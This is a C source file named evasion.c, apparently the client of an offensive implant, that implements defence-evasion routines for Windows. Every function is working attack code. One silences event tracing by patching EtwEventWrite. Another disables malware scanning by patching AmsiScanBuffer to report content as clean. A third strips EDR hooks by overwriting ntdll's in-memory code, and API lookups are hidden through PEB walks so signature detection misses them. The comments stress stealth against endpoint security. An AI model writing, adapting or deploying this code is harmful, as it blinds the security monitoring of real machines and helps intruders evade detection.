/*
 * client/evasion.c  –  User-mode evasion primitives
 * ==================================================
 * See evasion.h for API documentation.
 *
 * Design notes
 * ------------
 *  Dynamic imports — no GetModuleHandleA / GetProcAddress / LoadLibraryA in IAT
 *  ---------------------------------------------------------------------------
 *  Those three functions are extremely high-signal imports: every endpoint
 *  security product flags a binary that imports them alongside process-memory
 *  write APIs.  We replace them with PEB walks:
 *
 *    GetModuleHandleA("foo.dll")  →  peb_get_module(peb_hash_str("foo.dll"))
 *    GetProcAddress(h, "Bar")    →  peb_get_export(base, peb_hash_str("Bar"))
 *    LoadLibraryA("foo.dll")     →  resolve LoadLibraryA from kernel32 via PEB,
 *                                   then call the resolved function pointer.
 *
 *  All hashes are computed at runtime from string literals so they do not
 *  appear as pre-computed constants that AV/YARA can trivially match.
 *
 *  etw_patch / amsi_patch
 *  ----------------------
 *  Both patch in-process memory by writing a stub via SC_NtWriteVirtualMemory
 *  on the current process handle.  This avoids the VirtualProtect →
 *  PAGE_EXECUTE_READWRITE → write → restore sequence that was the previous
 *  approach: that RWX transition is a high-signal EDR event.
 *
 *  NtWriteVirtualMemory on the current process bypasses the normal page
 *  protection checks for same-process writes on Windows — the kernel
 *  copies the bytes directly without requiring a permission change.
 *  No RWX page ever exists.
 *
 *  unhook_ntdll
 *  ------------
 *  EDR products hook ntdll.dll by overwriting the first few bytes of
 *  syscall stubs with a JMP to their inspection trampoline.  Remapping
 *  the .text section from the on-disk image restores the original stubs.
 *
 *  Steps:
 *    1. Resolve ntdll base + on-disk path via PEB walk + GetModuleFileNameW.
 *    2. Map a fresh copy from disk with CreateFileMapping / MapViewOfFile.
 *    3. SC_NtWriteVirtualMemory the disk bytes over the in-process .text —
 *       no VirtualProtect / RWX page needed.
 *    4. Unmap / close the disk copy.
 *
 *  NOTE: sc_init() must be called before evasion functions that use
 *  SC_Nt* wrappers (unhook_ntdll, etw_patch, amsi_patch).  In main.c
 *  the call order is: inject_init() [calls sc_init()] → unhook_ntdll()
 *  → etw_patch() → amsi_patch().
 */

#include "evasion.h"
#include "peb_walk.h"
#include "syscall.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include <string.h>


/* ── _patch_self ─────────────────────────────────────────────────────────── */
/*
 * Write `len` bytes from `patch` to `target` in the current process using
 * SC_NtWriteVirtualMemory.  No VirtualProtect, no RWX page.
 *
 * Falls back to the VirtualProtect approach if the syscall engine is not
 * yet initialised (i.e. called before inject_init).
 */
static void _patch_self(void *target, const BYTE *patch, SIZE_T len)
{
    if (sc_ready()) {
        SIZE_T written = 0;
        SC_NtWriteVirtualMemory(GetCurrentProcess(), target,
                                (PVOID)patch, len, &written);
    } else {
        /* Fallback: VirtualProtect (still works, just less stealthy) */
        DWORD old = 0;
        if (VirtualProtect(target, len, PAGE_EXECUTE_READWRITE, &old)) {
            memcpy(target, patch, len);
            VirtualProtect(target, len, old, &old);
        }
    }
}


/* ── etw_patch ───────────────────────────────────────────────────────────── */
/*
 * Resolve ntdll + EtwEventWrite via PEB walk — no GetModuleHandleA /
 * GetProcAddress in the IAT.
 */

void etw_patch(void)
{
    /* peb_get_module: walk PEB->Ldr, hash "ntdll.dll" at runtime */
    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (!hNtdll) return;

    /* peb_get_export: walk PE export table, hash "EtwEventWrite" at runtime */
    PVOID pEtw = peb_get_export(hNtdll, peb_hash_str("EtwEventWrite"));
    if (!pEtw) return;

    /* Single-byte RET — callers receive rax=0 (STATUS_SUCCESS) */
    static const BYTE stub[] = { 0xC3 };
    _patch_self(pEtw, stub, sizeof(stub));
}


/* ── amsi_patch ──────────────────────────────────────────────────────────── */
/*
 * Resolve amsi.dll + AmsiScanBuffer via PEB walk.
 * If amsi.dll is not yet loaded, load it via a dynamically-resolved
 * LoadLibraryA pointer (fetched from kernel32 via PEB) — avoids importing
 * LoadLibraryA in the agent's own IAT.
 */

void amsi_patch(void)
{
    /* Try to find amsi.dll already in the LDR list */
    PVOID hAmsi = peb_get_module(peb_hash_str("amsi.dll"));

    if (!hAmsi) {
        /* amsi.dll not yet loaded — resolve LoadLibraryA from kernel32
         * through the PEB, then call it to load amsi.dll.
         * This keeps LoadLibraryA out of the agent's own IAT. */
        PVOID hKernel32 = peb_get_module(peb_hash_str("kernel32.dll"));
        if (!hKernel32) return;

        typedef HMODULE (WINAPI *pfnLoadLibraryA_t)(LPCSTR);
        pfnLoadLibraryA_t pfnLoadLibraryA =
            (pfnLoadLibraryA_t)peb_get_export(hKernel32,
                                              peb_hash_str("LoadLibraryA"));
        if (!pfnLoadLibraryA) return;

        hAmsi = (PVOID)pfnLoadLibraryA("amsi.dll");
        if (!hAmsi) return;
    }

    PVOID pScan = peb_get_export(hAmsi, peb_hash_str("AmsiScanBuffer"));
    if (!pScan) return;

    /*
     * xor eax, eax  (S_OK = 0)
     * ret
     * Callers check HRESULT first; S_OK → content treated as clean.
     */
    static const BYTE stub[] = { 0x33, 0xC0, 0xC3 };
    _patch_self(pScan, stub, sizeof(stub));
}


/* ── unhook_ntdll ────────────────────────────────────────────────────────── */
/*
 * Resolve ntdll base via PEB walk, then use GetModuleFileNameW
 * (still needed to get the on-disk path — it is a low-signal kernel32 import
 * compared to GetModuleHandleA/GetProcAddress).
 */

void unhook_ntdll(void)
{
    /* ── 1. Get ntdll base via PEB walk (no GetModuleHandleA) ────────── */
    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (!hNtdll) return;

    /* ── 2. Get on-disk path — GetModuleFileNameW from kernel32 by PEB ── */
    PVOID hKernel32 = peb_get_module(peb_hash_str("kernel32.dll"));
    if (!hKernel32) return;

    typedef DWORD (WINAPI *pfnGetModuleFileNameW_t)(HMODULE, LPWSTR, DWORD);
    pfnGetModuleFileNameW_t pfnGetModuleFileNameW =
        (pfnGetModuleFileNameW_t)peb_get_export(hKernel32,
                                                peb_hash_str("GetModuleFileNameW"));
    if (!pfnGetModuleFileNameW) return;

    WCHAR ntdllPath[MAX_PATH] = {0};
    if (!pfnGetModuleFileNameW((HMODULE)hNtdll, ntdllPath, MAX_PATH - 1)) return;

    /* ── 3. Map the on-disk copy ─────────────────────────────────────── */
    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE,
                                      0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return;

    LPVOID pDisk = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!pDisk) return;

    /* ── 4. Find .text section in both images ────────────────────────── */
    IMAGE_DOS_HEADER     *dos  = (IMAGE_DOS_HEADER *)pDisk;
    IMAGE_NT_HEADERS     *nth  = (IMAGE_NT_HEADERS *)((BYTE *)pDisk + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec  = IMAGE_FIRST_SECTION(nth);
    WORD                  nSec = nth->FileHeader.NumberOfSections;

    IMAGE_DOS_HEADER     *ldos = (IMAGE_DOS_HEADER *)hNtdll;
    IMAGE_NT_HEADERS     *lnth = (IMAGE_NT_HEADERS *)((BYTE *)hNtdll + ldos->e_lfanew);
    IMAGE_SECTION_HEADER *lsec = IMAGE_FIRST_SECTION(lnth);

    for (WORD i = 0; i < nSec; i++) {
        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;

        LPVOID pDiskText = (BYTE *)pDisk  + sec[i].VirtualAddress;
        LPVOID pLiveText = (BYTE *)hNtdll + lsec[i].VirtualAddress;
        SIZE_T cbText    = sec[i].Misc.VirtualSize;

        /* Write disk bytes over live .text — no VirtualProtect needed */
        if (sc_ready()) {
            SIZE_T written = 0;
            SC_NtWriteVirtualMemory(GetCurrentProcess(), pLiveText,
                                    pDiskText, cbText, &written);
        } else {
            /* Pre-sc_init fallback */
            DWORD old = 0;
            if (VirtualProtect(pLiveText, cbText, PAGE_EXECUTE_READWRITE, &old)) {
                memcpy(pLiveText, pDiskText, cbText);
                VirtualProtect(pLiveText, cbText, old, &old);
            }
        }
        break;
    }

    UnmapViewOfFile(pDisk);
}
